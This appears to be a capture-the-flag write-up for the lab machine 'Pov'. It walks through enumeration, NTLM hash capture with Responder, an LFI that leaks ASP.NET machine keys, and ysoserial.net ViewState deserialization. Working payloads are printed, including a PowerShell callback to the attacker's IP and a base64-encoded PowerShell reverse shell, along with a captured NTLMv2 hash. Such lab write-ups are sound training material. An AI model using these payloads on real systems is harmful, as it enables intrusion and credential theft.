# Pov

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.248.9
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 19:06 UTC
Nmap scan report for pov.htb (10.129.248.9)
Host is up (0.090s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.06 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.248.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 19:06 UTC
Nmap scan report for pov.htb (10.129.248.9)
Host is up (0.046s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.43 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.248.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 19:11 UTC
Nmap scan report for pov.htb (10.129.248.9)
Host is up (0.044s latency).
All 1000 scanned ports on pov.htb (10.129.248.9) are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5122.27 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.248.9    pov.htb
```

### Enumeration of Port 80/TCP

> http://10.129.248.9/

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://10.129.248.9/
http://10.129.248.9/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.248.9], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]
```

### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://10.129.248.9/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/reports/http_10.129.248.9/__24-01-27_19-06-23.txt

Target: http://10.129.248.9/

[19:06:23] Starting: 
[19:06:26] 403 -  312B  - /%2e%2e//google.com
[19:06:26] 301 -  146B  - /js  ->  http://10.129.248.9/js/                  
[19:06:26] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[19:06:26] 404 -    2KB - /.ashx                                            
[19:06:26] 404 -    2KB - /.asmx                                            
[19:06:31] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[19:06:33] 404 -    2KB - /admin%20/                                        
[19:06:33] 404 -    2KB - /admin.                                           
[19:06:41] 404 -    2KB - /asset..                                          
[19:06:44] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[19:06:47] 301 -  147B  - /css  ->  http://10.129.248.9/css/                
[19:06:48] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[19:06:54] 301 -  147B  - /img  ->  http://10.129.248.9/img/                
[19:06:54] 404 -    2KB - /index.php.                                       
[19:06:55] 404 -    2KB - /javax.faces.resource.../                         
[19:06:55] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[19:06:55] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[19:06:55] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[19:06:55] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[19:06:55] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[19:06:55] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
[19:06:55] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[19:06:55] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc            
[19:06:55] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[19:06:55] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true 
[19:06:55] 403 -    1KB - /js/                                              
[19:06:55] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
[19:06:55] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage    
[19:06:57] 404 -    2KB - /login.wdm%2e                                     
[19:07:08] 404 -    2KB - /rating_over.                                     
[19:07:10] 404 -    2KB - /service.asmx                                     
[19:07:13] 404 -    2KB - /static..                                         
[19:07:17] 403 -    2KB - /Trace.axd                                        
[19:07:17] 404 -    2KB - /umbraco/webservices/codeEditorSave.asmx          
[19:07:19] 404 -    2KB - /WEB-INF./                                        
[19:07:21] 404 -    2KB - /WebResource.axd?d=LER8t9aS                       
                                                                             
Task Completed
```

### Subdomain Enumeration with ffuf

```c
┌──(user㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.pov.htb" -u http://pov.htb --fs 12330

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12330
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 92ms]
:: Progress: [114441/114441] :: Job [1/1] :: 727 req/sec :: Duration: [0:02:29] :: Errors: 0 ::
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.248.9    pov.htb
10.129.248.9    dev.pov.htb
```

> http://dev.pov.htb/portfolio/

> view-source:http://dev.pov.htb/portfolio/

```c
                <div class="col-sm-6">
                    <p>Copyright <script>document.write(new Date().getFullYear())</script> &copy; <a href="http://dev.pov.htb:8080" target="_blank">dev.pov.htb</a></p>
                </div>
```

| Potential Email Address |
| --- |
| sfitz@pov.htb |

> http://dev.pov.htb:8080

We intercepted the request with `Burp Suite`.

Request:

```c
POST /portfolio/contact.aspx HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 379
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/contact.aspx
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__VIEWSTATE=zkVMNM9A77aRIVfSEiG%2FVhj%2BWH3%2BlQcRC1G0rHm1%2FuFr3BUO6XKIJgUYUock9KWGAC06PlSnuM%2F%2Bq9UVjUd%2FAr9gBTQ%3D&__VIEWSTATEGENERATOR=37310E71&__EVENTVALIDATION=hhGTunFP3LjHr516QO8yv90lYtbrFjHzUyIvUUH%2BCPJK%2Fa4FxSaU4mDMAuYxMu%2B45q76nt9njnRm5h653%2B%2BLqSIGoNz05e9FrGJcHiGvgk%2BDuUP8p%2FC%2FhOfu5BKYvbc4rEUnTw%3D%3D&message=%3Ch1%3Efoobar%3C%2Fh1%3E&submit=Send+Message
```

Response:

```c
GET /default.aspx?aspxerrorpath=/portfolio/contact.aspx HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.pov.htb/portfolio/contact.aspx
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

We downloaded the `CV`.

### Analyzing with exiftool

```c
┌──(user㉿kali)-[~/Downloads]
└─$ exiftool cv.pdf 
ExifTool Version Number         : 12.70
File Name                       : cv.pdf
Directory                       : .
File Size                       : 148 kB
File Modification Date/Time     : 2024:01:27 19:09:49+00:00
File Access Date/Time           : 2024:01:27 19:09:49+00:00
File Inode Change Date/Time     : 2024:01:27 19:09:49+00:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Language                        : es
Tagged PDF                      : Yes
XMP Toolkit                     : 3.1-701
Producer                        : Microsoft® Word para Microsoft 365
Creator                         : Turbo
Creator Tool                    : Microsoft® Word para Microsoft 365
Create Date                     : 2023:09:15 12:47:15-06:00
Modify Date                     : 2023:09:15 12:47:15-06:00
Document ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
Instance ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
Author                          : Turbo
```

| Potential Username |
| --- |
| Stephen Fitz |

## Getting NTLM Hash

We intercepted the download of the `CV` and changed the `filename`.

```c
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 384
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=oOTtyH26oa12NN09oh4TAH%2BXXZ5urnif1yGUx1UjIxJjKWSUHH0Dim63N9%2B8ltgIthL4AkBjbyWiXdU0a%2BDZF3cpvcA%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=cmDniIBDj17%2FxSXa93143DgR334sjcSXaIfxYMIE0sKDEhgcizBUsEEA4hA%2FPj7uOUPJhMG6bFJBUc4lgbnjFRyofouqbdgAHlQYh8Gqv1Ei0I1DLCa5PqBWUX7dvEilPiy%2FCQ%3D%3D&file=default.aspx
```

Request:

```c
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 373
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=oOTtyH26oa12NN09oh4TAH%2BXXZ5urnif1yGUx1UjIxJjKWSUHH0Dim63N9%2B8ltgIthL4AkBjbyWiXdU0a%2BDZF3cpvcA%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=cmDniIBDj17%2FxSXa93143DgR334sjcSXaIfxYMIE0sKDEhgcizBUsEEA4hA%2FPj7uOUPJhMG6bFJBUc4lgbnjFRyofouqbdgAHlQYh8Gqv1Ei0I1DLCa5PqBWUX7dvEilPiy%2FCQ%3D%3D&file=\\10.10.16.34\foobar
```

```c
┌──(user㉿kali)-[~]
└─$ sudo responder -I tun0   
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.34]
    Responder IPv6             [dead:beef:4::1020]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-VW62D1YY9U9]
    Responder Domain Name      [FUMM.LOCAL]
    Responder DCE-RPC Port     [49968]

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.248.9
[SMB] NTLMv2-SSP Username : POV\sfitz
[SMB] NTLMv2-SSP Hash     : sfitz::POV:4a181d084e2f02fe:AD792C6A4E14E3D71890763E19D3CFAC:010100000000000000A6AEC75651DA015903536F6A9CB4E50000000002000800460055004D004D0001001E00570049004E002D005600570036003200440031005900590039005500390004003400570049004E002D00560057003600320044003100590059003900550039002E00460055004D004D002E004C004F00430041004C0003001400460055004D004D002E004C004F00430041004C0005001400460055004D004D002E004C004F00430041004C000700080000A6AEC75651DA01060004000200000008003000300000000000000000000000002000004DB357D712FB8CF2EC74AECBD3A64007932E96FCC7257A18680477B5F62C05040A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330034000000000000000000
```

## More Enumeration through Local File Inclusion (LFI)

Request:

```c
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 386
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=oOTtyH26oa12NN09oh4TAH%2BXXZ5urnif1yGUx1UjIxJjKWSUHH0Dim63N9%2B8ltgIthL4AkBjbyWiXdU0a%2BDZF3cpvcA%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=cmDniIBDj17%2FxSXa93143DgR334sjcSXaIfxYMIE0sKDEhgcizBUsEEA4hA%2FPj7uOUPJhMG6bFJBUc4lgbnjFRyofouqbdgAHlQYh8Gqv1Ei0I1DLCa5PqBWUX7dvEilPiy%2FCQ%3D%3D&file=C:\inetpub\wwwroot\dev\web.config
```

Response:

```c
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=C:\inetpub\wwwroot\dev\web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sat, 27 Jan 2024 19:39:51 GMT
Connection: close
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>

```

| Decryption Key |
| --- |
| 74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43 |

## Foothold via .Net Serialization

> https://github.com/pwntester/ysoserial.net

> https://book.hacktricks.xyz/pentesting-web/deserialization#ysoserial.net

```c
PS C:\opt\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release > .\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.34/$env:UserName" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
UmP8l8rx3LwnylPz%2ByOszlKDk%2BltQifZY7EckUpAs08TLAsYFEI2YrxcdLquR5hmwt6yJl7ZXCJ%2Bh9oo1RqclRpNhgMyOzK8oYa%2B5V7rbyx9t5nFKIJCZl04kD3L%2F9AKR90zuTSx7hB9iy90gEB1Kx4q8Ikfh4UsZq1U%2BeO0GVWeD1PZWEb53pWErhVu62SSVhC0YxOsULKUUgFXq7SxNqr5%2BWe9Q3PGgvkM4YrINONPxo8FDCxYgHvnhENPChLgT8RpVJqyqA2CdS2E4Wg%2FfMZefPoPFQGhng%2Bc0UPzHZMLPv%2F53ETVwuNtq%2BJIY10hQxoWTLfYZQaaJFgKRZa2rrP2S6Brc4d2tv4ujob7x0QSA%2FgL7lWjTT29YpVFlV1rhr2ilvRJRGLM3JrzPZXlmY%2FStpiRazJ3ARVQq5lj3FxOE2lJ7PeLc6gCaw6xzfAcNWt7ilzBBAjkwNr%2Bp16igBNqRotIOfMqCgftc%2FG1bn8UWaiMTEwzYgkEBzqWG1z33oWP5QFdoBsBJlzhjJCx%2BCD14aj%2FpIncvTd0NtGMnmkSjLOY85vm3ZKsvrVPDOtfQRp62ErsYqOrz7aaKVobddfHxg74o4OTvQkZsvIyeTuH%2FZUJr4EMSVHpp1ZokLSRKJsErMPRGrgCPkm5PY4PB0xEIEllvTYHb%2FQQ2Vmel4CN9F2qe3TPzxJ9fINmMY0426BCjaBWGI5mVTqmDwniO5nKl%2B2e79hXdx8YWoMHf%2FtULgdB9F%2Bk8bJoANvvqPoWLpXEf3wQyFznG%2ByYLWtFDWPgthR6YdzjIM5CLz9O6M9NimpyanRlA7nyCvgjjyhtP35yhENVqI0xXJV6x9VcAM6Q5w%2BIR9YzoBsoW0%2Fijl397Gwqn1nL9PsGtQHHktS32Vw7NXOPpwUEqP517oQjlgxusCK3YOUzy9iJRyts1dVMoNmG1zOWQLKe1Nc%2FDkOFHFShrO1r%2BErCzV%2BYUVMalSQYErnw1WSBXnicSYcTYoKqcFmEll7tk6%2FXVCbCmo2zBjl7PPxx0XHe%2BoOHLqpPIimRX552YHVL4C2gIDAFNlE%2FFudOcXEaSqNA0aWg5%2Bb7041AqiFmXIfVmBmJiwg93H32Ssro9plMsXin3PmzT7l47Cap%2FJR8Zb%2FBNl%2Biu8IKBUWBALxeP2NqHphmYnNzKa4KYbIE2NDTTwKmdAyH6FhMlKOpVcdQjiFNo9cl%2FMBKNdQxWjRzEmYPumxNa%2Bv1%2Fnd3WIEwGxoqZM6s2CahZo%2B78kjCSHrU6SBN2SemwsZWtxU2zBijWIOS%2FCrAqvIN57NqFuC6vvP0%2Boyt4QS%2B1kyszFV5FHmiydjaMAHMbsv3gKvztq5xHqoFaNIRZFPpsc0Q5Wk%3D
COMMANDO 01/27/2024 11:51:01
```

Payload:

```c
PS C:\opt\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release > .\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
dvTrnfBVRCFygCBTgyFcWdfcAffrPXATSoI1Dn3cKYOmJ5r8YedUN%2BGPsFdRkI%2FukRxmitUSpN4rP1i3my6EUoI40u9U0pNTxaBHzXLDayQeJ6WERL4js6Rww%2BzBUjN5bb9ghDFs6vQdtlWocfADRkKes2xn8ofMsWkN43VwNQCidFgxujSR0FOzRlkrOzXvDoCqz29YUDKq8r%2FcLZYM3uJrzLKwv4Xli%2Ft5evDByAZHRgaoKQ1vadAFNaldXuUnfY2EWy9r5W70VgrDo1841B%2BggyJsQZ464NwHNujFCPFIDufgWlVLnjSoc9wDDrkNc8eXYyavS6FUwfzVPXoKX6oItEE%2FNkAYiRFdOn1ebQKwnYGJW9vG%2Bkm%2BrfDJHL89Pkc3IU5%2BnFud7HaIhes3Z%2BbZBcumMEkI3VrETFD7gcPmWiUgp9Dw7BCnG2WW%2FB%2B5rZuc0TH5U5ilt%2FDdQ3kF8ZEKkxmO8Z6Kfar0jKuli2CbOkzI8%2BmlQOCqUao%2FbvEfns0kqUD6dq7SSt2p2u%2Bk85%2FnQyjFx2jrl5tlXDJ6t3CMHLKPSCGTbXdAQmmomNj8noqn48t%2Be8J6vdGOgWVVDd9sC3IVTDT%2FWPCTADIS7qyc82Y1jE9j7ruxKdjj3ZMwdaeCsGeW5xYj%2FnL1nebyKrlll1Vk%2FbNkU7PR%2Bln2yn0QKcRFhiLecmoJ7xN7CNd%2FTqNQnihGffiihTr8rqNeh40Gw9ObRSiBRWLa%2FvGS85%2Beww2oz4Oibnt51j6q5qr5TmcsZImIKYK2OVfkj9ONtG6i9V3LbNpQ2QeQktH1cqGqurCmdII2j%2BaPm0k%2Fcl3AJ8U6XumT%2BDpOBFFqQjy556wcsfYB8Bn4aamWMIN%2Fjfj2jPCvc8gqsFAiR9vnbsGiL6JhqNaS93m243%2F3G7%2BgQIcoTnhuqayhxIHAqOF%2FhREVfaKtL3RLXVAsUapOZoS9h9bVrRT3IUOlCaBJY6Hg1Mfzpr%2BBlEtkWJM4YAEMvMF5KObzBS9ZwDI%2B8QtRtnIW0ct9IFbpYt2YY6qKSPt1XJvJXGwQuVk3f%2B%2FuXjXHw3ntHleiAnhOHKjsUsLyykhvtZn3uduFk3ff2gs6RWjng2VlrSG9KW7eyAwuUZZuCuT%2FWFmhM6lviUpKFDvHTeXxXZtES2X3hZ0auclAPQE%2BDgzgzncdqBDfKVRi1iRrGpYVrBtgAgQ6evlKW6K7kWie%2Bkl%2BoYPvxW2CyjwHkBxKLwU1UZ%2FYTpOH%2FlIi7bggOtKSUKj318jBtjhU78RT91LPZYcwzWVAYHjLW0tN%2B9heM6QxeZRK8%2FQ%2BGt3Lw8qnIzFiGA%2BI70VnJTPHZxTVFcvP12wdO6C%2BF%2B1fRHY8BV7O8cQ09dX%2F7wv%2Bpm%2FP7w2BUga0%2BnaeTGi6CizfSJC1cW7reA3tbZq83mnctv6BMNIrzNRJVDYsZN3%2Bnm7OpDgYY2pzjkwgXQsRRvps2ML1qgUwEl4EioOnh5Sc6LOOhdGzOfcDFhGaLnwUhlfyzkgXzIBtXUR%2BBlmxyPQuFTeFw6Br0a1SbTP9x%2FTsRTc08DflNEU52JhF3geKrjs86gnjZ5ulch4Q4aKgxlxCmMLKvLYfFpxJLg5JLPy0hc0dWZnT6lggHgi1FhIpZaMI2Es5UgNjAZegodDhQmbUSRMZVNN4EKlMYvZ%2B8CLqZ%2Beahvu1KuggQv7lEdIzBS6NnBbDYhOz3cHSO73Db2y2jZ%2Fvz9%2BizQpfJ%2BBTCkEANYvOCtsMjqfkdw916fqsouOjKl0WE8wtHjNIu6xM%2F4oSbFZxeJU46XKClxQq8vtzA3NAMSJMWFqi3LTgLqNiTgU5LpBs1cp79ijL078UR2uxnytSItUl6V7eT6EZ8enBUB3JC28dD8umkQR8%2B9P8ORZymzXPZxqUX0EvVH5It%2BGhG7e99rxOip6Ryxy5ZRwPgBTU9T771UpvSv%2FPOKjzu6ttUC3o6jwPrP8rca84JGMJ1i43f5qoZhh7ODHNMtlRcrOyv%2FzmBqCP17Z1E2Zni3ZlXY9iDW4Vs0Zj2%2FpzFqF3jlv0J0HmJb2J9E02B91saNVX2zOq1Cndd4JVyyskj6xI2Cd1gnuCoyuKGr4pmuGVDJQanShb2h8g1y6KcnJ6PpVGBx2%2BJeUQWAVFriUpi5mJw3rXwQ3ss1o0KLJqphU92daSqVrzqoWpIWexYnPhAFkYwX%2FhAKLPyLKGLaBDtI5PhiVTBnI2qGE5l2bot6hYpCUM6tjM0jCaA9%2FtriadlhDTZCxCEZLcgwjMJk%2F2g8yy7muNdwenQsc6zsnYy3I5n5eT8Q4iuXiRGO9H3MPFHNBwcdEmJl5f2awMhphwQSo1yGUUpPYsE8O6WpRxd6g2T0ORgIk9oGrBf%2FBQQBxKqDeouo0w%2FDC2d3nVbs%2Fz5yOQpp%2BHmoQSG18Juo%2BZaXKyVEFXZH7vWctDmJDoP7SyrrUYgCf9ZTIpR21tbFO7NhKbWNdAk9RXihVlcGMYAMNeY9K2yktSbBW%2BTNKygGadzxY5zj%2BQO1UR9xWWUs7B9dLxuMTLiAJSaKhkECI4dZkh4h%2FyPToTtjPVO